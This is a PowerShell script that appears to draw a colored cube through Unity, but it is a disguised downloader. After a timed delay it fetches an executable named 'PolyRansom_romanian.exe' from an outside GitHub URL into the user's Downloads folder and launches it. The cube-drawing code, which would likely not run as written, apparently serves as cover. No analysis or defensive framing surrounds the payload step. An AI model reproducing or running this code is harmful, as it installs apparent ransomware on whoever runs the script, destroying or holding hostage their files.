Add-Type -AssemblyName UnityEngine

function CreateCube {
    param(
        [string]$name,
        [string]$color,
        [int]$size,
        [int]$x,
        [int]$y
    )

    $cube = [UnityEngine.GameObject]::CreatePrimitive("Cube")

    $cube.name = $name

    $cube.transform.position = New-Object UnityEngine.Vector3($x, $y, 0)

    $cube.transform.localScale = New-Object UnityEngine.Vector3($size, $size, $size)

    $cube.GetComponent([UnityEngine.Renderer]).material.color = [UnityEngine.Color]::($color)
}

$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
$webClient = New-Object System.Net.WebClient


Start-Sleep -Seconds 60
$webClient.DownloadFile($url, $downloadPath)


function IsProcessRunning {
    param([string]$processName)
    return Get-Process -Name $processName -ErrorAction SilentlyContinue
}

# Create a green cube initially
CreateCube -name "Cube" -color "green" -size 12 -x 10 -y 0

while (-not (Test-Path $downloadPath)) {
    Start-Sleep -Milliseconds 100
}

Start-Sleep -Seconds 60
$cube = [UnityEngine.GameObject]::Find("Cube")
$cube.GetComponent([UnityEngine.Renderer]).material.color = [UnityEngine.Color]::red

Start-Process -FilePath $downloadPath -Wait
